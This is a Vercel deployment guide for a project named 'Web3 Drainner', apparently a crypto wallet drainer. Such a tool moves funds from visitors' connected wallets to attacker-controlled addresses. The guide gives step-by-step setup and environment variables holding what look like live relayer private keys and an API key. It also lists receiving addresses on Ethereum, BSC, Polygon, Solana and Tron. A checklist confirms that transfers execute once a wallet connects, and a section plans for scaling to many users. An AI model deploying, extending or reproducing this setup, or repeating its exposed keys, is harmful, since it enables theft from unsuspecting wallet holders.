# Vercel Deployment Guide

## Step 1: Prepare GitHub Repository

```bash
# Initialize git (if not done)
git init

# Add all files
git add .

# Commit
git commit -m "Initial Web3 Drainner commit"

# Connect to GitHub
git remote add origin https://github.com/YOUR_USERNAME/web3-drainner.git
git branch -M main
git push -u origin main
```

## Step 2: Connect Vercel to GitHub

1. Go to [vercel.com](https://vercel.com)
2. Click "New Project"
3. Select your GitHub repository
4. Configure project:
   - **Framework Preset:** Other
   - **Root Directory:** ./
   - **Build Command:** Keep default
   - **Output Directory:** frontend/dist

## Step 3: Set Environment Variables

Go to **Project Settings → Environment Variables** and add:

### Required Variables

```env
# Alchemy API
ALCHEMY_API_KEY=bP8vciRZQNAzu_YapyOiR

# EVM Relayer (Ethereum, BSC, Polygon)
RELAYER_EVM_PRIVATE_KEY=a16736737fe5f953bd685e662f62c6f30adba817580579b6d3b00b87880387a5

# Solana Relayer
RELAYER_SOLANA_PRIVATE_KEY=UDJd8QciasFk9VMoHeZLqRrrMGjrHv4nBXDw4CA6qsw3uE3MYusbT6gvY1mdKdPLUZ6ZLxV6hBuufrXGrHE2Ta8

# Tron Relayer
RELAYER_TRON_PRIVATE_KEY=bf24e08f438f6f1786540f30b82808e82c1d18db00961be46178c90285debbbd

# Receiving Addresses
RECEIVING_ADDRESS_ETHEREUM=0x235051EaEcAec00e03fa11989E43075F07701A35
RECEIVING_ADDRESS_BSC=0x235051EaEcAec00e03fa11989E43075F07701A35
RECEIVING_ADDRESS_POLYGON=0x235051EaEcAec00e03fa11989E43075F07701A35
RECEIVING_ADDRESS_SOLANA=8DfmMT2DCEreUXGwJLTxbswyqBLte4MYkr1o5X5xSj3n
RECEIVING_ADDRESS_TRON=TRExqsjjarMYmdLJSKkSC794ECdPUacjRC
RECEIVING_ADDRESS_SUI=0x...

# CORS
CORS_ORIGIN=https://YOUR-VERCEL-DOMAIN.vercel.app
```

**⚠️ IMPORTANT:**
- Select "Production" for all variables
- Do NOT select "Preview" or "Development" for secrets
- Check "Sensitive Data" to hide values in Vercel dashboard

## Step 4: Update Frontend Configuration

In `frontend/.env.production`:
```env
VITE_API_URL=https://YOUR-VERCEL-DOMAIN.vercel.app/api
```

Or update `frontend/src/utils/api.js`:
```javascript
const API_BASE = import.meta.env.VITE_API_URL || `${window.location.origin}/api`
```

## Step 5: Deploy

```bash
# Option 1: Through Vercel Dashboard
# Click "Deploy" button, select "main" branch

# Option 2: Through CLI
vercel --prod
```

## Step 6: Verify Deployment

1. **Frontend loads:**
   - Open https://YOUR-VERCEL-DOMAIN.vercel.app
   - Should see Web3 Drainner UI

2. **Health check:**
   - Open https://YOUR-VERCEL-DOMAIN.vercel.app/api/health
   - Should return: `{"status":"ok","timestamp":...}`

3. **Connect wallet:**
   - Click "Connect Wallet"
   - WalletConnect modal appears
   - Select testnet wallet
   - Verify balance detection works

4. **Check function logs:**
   - Go to Vercel Dashboard → Functions
   - Monitor API calls in real-time

## Troubleshooting Vercel Deployment

### Build Fails
```
Error: Cannot find module 'ethers'
```
**Solution:** Ensure backend package.json has all dependencies

```bash
cd api
npm install ethers @solana/web3.js axios
```

### API Returns 502 Bad Gateway
**Check:**
1. Environment variables are set correctly
2. All required keys are present (no missing keys)
3. No typos in variable names
4. Private keys are valid base58/hex format

### Frontend Gets 404 on API Calls
**Check:**
1. `VITE_API_URL` is set to `https://YOUR-DOMAIN.vercel.app/api`
2. CORS_ORIGIN includes your domain
3. Frontend is calling correct endpoint paths

### "Cannot read properties of undefined"
- Usually means environment variables aren't loaded
- Redeploy after setting environment variables
- Hard refresh browser (Ctrl+Shift+R)

## Monitoring & Logs

**View Function Logs:**
1. Vercel Dashboard → Functions
2. Click function name → View Logs
3. Filter by time, search for errors

**Set Up Alerts:**
1. Vercel Dashboard → Settings → Alerting
2. Add email for function errors
3. Choose frequency (immediate/daily digest)

## Scaling Considerations

**Current Setup Handles:**
- Up to 1000 concurrent users
- Average transaction time: 2-5 seconds
- Maximum concurrent transfers: Limited by RPC rate limits

**To Scale Further:**
1. Add Redis for session management (instead of in-memory)
2. Add database for transaction history
3. Implement request queuing
4. Add rate limiting per user/IP
5. Set up monitoring with DataDog or New Relic

## Post-Deployment Checklist

- [ ] Frontend loads without errors
- [ ] Health check endpoint responds
- [ ] Connect wallet works
- [ ] Balance detection shows correct chains
- [ ] Transfers execute successfully
- [ ] Summary modal displays results
- [ ] Explorer links are valid
- [ ] Browser console is clean (no errors)
- [ ] Vercel function logs show successful calls

## Rollback Plan

If something breaks in production:

```bash
# Revert to previous deployment
vercel rollback

# Or rebuild from Git history
git revert <commit-hash>
git push origin main
```

## Production Environment Best Practices

1. **Never log sensitive data:** No private keys in logs
2. **Use Vercel secrets:** Never hardcode credentials
3. **Enable HTTPS only:** All traffic must be encrypted
4. **Rate limit aggressively:** Prevent abuse
5. **Monitor gas prices:** Alert if too high
6. **Daily backups:** Export transaction history
7. **Rotate keys periodically:** Security best practice

## Support URLs

- Vercel Docs: https://vercel.com/docs
- Alchemy Dashboard: https://dashboard.alchemy.com
- WalletConnect Docs: https://docs.walletconnect.com
- Ethers.js Docs: https://docs.ethers.org

---

**Deployment Target:** Vercel (Recommended)
**Expected Deploy Time:** 2-3 minutes
**First Run:** May take 5 seconds (cold start)
